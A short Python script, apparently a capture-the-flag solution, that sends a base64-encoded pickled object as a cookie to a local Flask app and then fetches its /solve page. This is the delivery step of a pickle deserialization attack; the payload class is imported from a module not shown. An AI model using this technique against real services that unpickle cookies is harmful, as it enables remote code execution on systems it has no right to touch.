#!/usr/bin/env python3
import base64
import functools
import os
import pickle
import requests
import flask

from UserData import UserData

cookies = {
    "data": base64.b64encode(pickle.dumps(UserData())).decode()
}

response = requests.get("http://localhost:5000/", cookies = cookies)
response = requests.get("http://localhost:5000/solve")
print(response.text)